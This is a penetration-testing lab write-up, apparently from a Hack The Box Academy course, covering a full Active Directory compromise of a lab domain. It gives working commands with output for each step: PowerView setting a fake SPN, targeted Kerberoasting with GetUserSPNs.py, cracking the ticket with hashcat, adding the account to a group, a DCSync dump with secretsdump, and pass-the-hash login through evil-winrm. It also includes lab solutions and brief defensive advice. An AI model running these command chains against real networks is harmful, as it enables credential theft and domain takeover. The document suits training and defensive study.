# 👑 Active Directory Compromise

## 🎯 Overview

**Active Directory Compromise** represents the **final phase** of enterprise network penetration testing. Leverage **GenericWrite privileges** for **targeted Kerberoasting**, exploit **Server Admins group membership** for **DCSync attacks**, and achieve **Domain Administrator access** through systematic privilege escalation and credential harvesting.

## 🔍 BloodHound Attack Path Analysis

### 🎯 GenericWrite Privilege Discovery

```cmd
# mssqladm account analysis:
- GenericWrite over ttimmons user
- SQL service account privileges
- Domain credential access capability

# Attack vector identification:
GenericWrite → Fake SPN creation → Targeted Kerberoasting → Password cracking
```

### 📊 Attack Chain Visualization

```cmd
# Privilege escalation path:
mssqladm (GenericWrite) → ttimmons (GenericAll) → Server Admins → DCSync

# BloodHound query results:
1. MSSQLADM@INLANEFREIGHT.LOCAL → GenericWrite → TTIMMONS@INLANEFREIGHT.LOCAL
2. TTIMMONS@INLANEFREIGHT.LOCAL → GenericAll → SERVER ADMINS@INLANEFREIGHT.LOCAL  
3. SERVER ADMINS@INLANEFREIGHT.LOCAL → GetChanges/GetChangesAll → INLANEFREIGHT.LOCAL
```

## 🎫 Targeted Kerberoasting Attack

### 🔧 Fake SPN Creation

```powershell
# PSCredential object creation
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)

# Fake SPN assignment
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose

# Verification:
[*] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons'
```

### 🎯 TGS Ticket Extraction

```bash
# Targeted Kerberoasting attack
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons

# Results:
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  --------  --------  --------------------------  ---------  ----------
acmetesting/LEGIT     ttimmons            2022-06-01 14:32:18.194423  <never>               

# TGS ticket captured:
$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$[HASH_DATA]
```

### 🔐 Password Cracking

```bash
# Hashcat TGS cracking
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt

# Successful crack:
ttimmons:[CRACKED_PASSWORD]

# Attack completion time:
Time.Started.....: Wed Jun 22 16:32:27 2022 (22 secs)
Status...........: Cracked
Progress.........: 10678272/14344385 (74.44%)
```

## 🔺 Server Admins Group Escalation

### 👥 Group Membership Manipulation

```powershell
# PSCredential object for ttimmons
$timpass = ConvertTo-SecureString '[CRACKED_PASSWORD]' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)

# Server Admins group addition
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose

# Verification:
[*] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622'
```

### 🎯 DCSync Privileges Inheritance

```cmd
# Server Admins group capabilities:
- GetChanges privilege (INLANEFREIGHT.LOCAL)
- GetChangesAll privilege (INLANEFREIGHT.LOCAL)
- DCSync attack capability
- Complete domain credential access

# BloodHound confirmation:
SERVER ADMINS → DCSync → INLANEFREIGHT.LOCAL domain
```

## 🔄 DCSync Attack Execution

### 💎 NTDS Database Extraction

```bash
# Complete domain credential dump
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm

# Expected output:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

# Key accounts extracted:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[DOMAIN_ADMIN_HASH]
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[KRBTGT_HASH]
[ALL_DOMAIN_USERS]:[RESPECTIVE_HASHES]
```

### 👑 Domain Administrator Access

```bash
# Pass-the-Hash authentication to DC
proxychains evil-winrm -i 172.16.8.3 -u Administrator -H [DOMAIN_ADMIN_HASH]

# Verification:
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
inlanefreight\administrator

# Domain Controller access confirmed:
hostname → DC01
ipconfig → 172.16.8.3 (Domain Controller)
```

## 🎯 Post-Compromise Activities

### 📊 Complete Domain Control Validation

```cmd
# Domain Administrator capabilities:
- Complete Active Directory control
- All user account access
- Group Policy modification rights
- Trust relationship management
- Certificate Authority access (if present)

# Evidence collection priorities:
- Screenshot of Domain Controller access
- NTDS database dump completion
- Administrative command execution proof
- Network topology confirmation
```

### 🔒 Cleanup and Documentation

```powershell
# Remove fake SPN (operational security)
Set-DomainObject -credential $Cred -Identity ttimmons -Clear serviceprincipalname -Verbose

# Remove from Server Admins group
Remove-DomainGroupMember -Identity "Server Admins" -Members 'ttimmons' -Credential $timcreds -verbose

# Document all changes:
- Fake SPN creation and removal
- Group membership modifications
- Password changes performed
- Registry/system modifications
```

## 🏆 Complete Attack Chain Summary

### 🚀 External → Domain Admin Path

```cmd
# Phase 1: External Reconnaissance
Nmap scans → DNS zone transfer → Subdomain discovery → 11 web applications

# Phase 2: Initial Foothold  
Web application testing → Command injection → Reverse shell → TTY upgrade

# Phase 3: Persistence & Privilege Escalation
Audit log mining → SSH access → GTFOBins → Root access

# Phase 4: Internal Reconnaissance
SSH pivoting → Host discovery → NFS exploitation → Credential harvesting

# Phase 5: Lateral Movement
DNN admin access → PrintSpoofer → SYSTEM → Multiple host compromise

# Phase 6: Active Directory Compromise
BloodHound analysis → GenericWrite abuse → Targeted Kerberoasting → DCSync → Domain Admin
```

### 📋 Comprehensive Findings Summary

```cmd
# Critical/High Risk Findings:
1. Unrestricted File Upload → RCE
2. Command Injection → System compromise
3. Insecure File Shares → Credential exposure
4. Weak Active Directory Passwords → Domain compromise
5. Excessive AD Group Privileges → Lateral movement
6. GenericWrite ACL Misconfiguration → Privilege escalation
7. DCSync Privileges → Complete domain access

# Medium Risk Findings:
8. HTTP Verb Tampering → Information disclosure
9. IDOR Vulnerabilities → Data exposure
10. Directory Listing Enabled → Information leakage
11. Kerberoasting Vulnerabilities → Credential attacks

# Informational Findings:
12. Abandoned Test Applications → Attack surface
13. Legacy Credentials in Scripts → Historical exposure
14. Passwords in AD Descriptions → Information disclosure
```

## 🛠️ Tools & Techniques Mastery

### 🔍 Reconnaissance Tools

```bash
# External enumeration:
Nmap, DNS zone transfers, EyeWitness, Gobuster, WPScan

# Internal enumeration:  
BloodHound, SharpHound, PowerView, Snaffler, CrackMapExec

# Credential hunting:
Secretsdump, Mimikatz, LaZagne, Registry analysis
```

### ⚔️ Exploitation Techniques

```bash
# Web application attacks:
SQL injection, XSS, XXE, SSRF, File upload bypasses

# Privilege escalation:
PrintSpoofer, GTFOBins, Sysax Automation, Unattend.xml

# Active Directory attacks:
Kerberoasting, Password spraying, DCSync, ACL abuse
```

## 🎯 HTB Academy Labs

### 📋 Final Lab Solutions

```cmd
# Lab 1: Targeted Kerberoasting
1. BloodHound analysis → GenericWrite identification
2. PSCredential creation → mssqladm authentication  
3. Fake SPN assignment → acmetesting/LEGIT
4. TGS ticket extraction → GetUserSPNs.py
5. Password cracking → Hashcat success
6. Password discovery → ttimmons:[PASSWORD]

# Lab 2: Domain Controller Access
1. Group membership addition → ttimmons to Server Admins
2. DCSync privilege inheritance → GetChanges/GetChangesAll
3. NTDS database dump → secretsdump.py execution
4. Domain Admin hash → Administrator NT hash
5. DC authentication → Pass-the-Hash WinRM
6. Flag retrieval → Administrator Desktop access

# Lab 3: NTDS Hash Extraction
1. DCSync attack execution → Complete credential dump
2. Administrator hash extraction → Domain Admin access
3. Evidence collection → NTDS database analysis
```

### 🔍 Professional Methodology Demonstrated

```cmd
# Systematic approach:
- Complete external enumeration before internal pivot
- Establish multiple persistence mechanisms
- Document all attack paths and evidence
- Maintain operational security during testing

# Advanced techniques:
- Multi-stage privilege escalation chains
- Complex pivoting and tunneling setups
- Active Directory attack path exploitation
- Professional cleanup and documentation

# Real-world application:
- Enterprise network penetration methodology
- Complete attack chain from external to Domain Admin
- Evidence collection for professional reporting
- Client communication and impact demonstration
```

## 🛡️ Comprehensive Defensive Recommendations

### 🔒 Active Directory Hardening

```cmd
# Privilege management:
- Implement least privilege principles
- Regular ACL audits and cleanup
- Monitor privileged group memberships
- Implement Privileged Access Management (PAM)

# Authentication security:
- Deploy strong password policies
- Implement multi-factor authentication
- Monitor for Kerberoasting attacks
- Regular credential rotation

# Monitoring and detection:
- Deploy advanced threat detection
- Monitor DCSync attack attempts
- Implement honeypot accounts
- Regular security assessments
```

### 🌐 Network Security

```cmd
# Segmentation:
- Implement proper network segmentation
- Deploy zero-trust architecture
- Restrict lateral movement capabilities
- Monitor east-west traffic

# Application security:
- Regular web application security testing
- Implement secure development practices
- Deploy Web Application Firewalls
- Regular vulnerability assessments
```
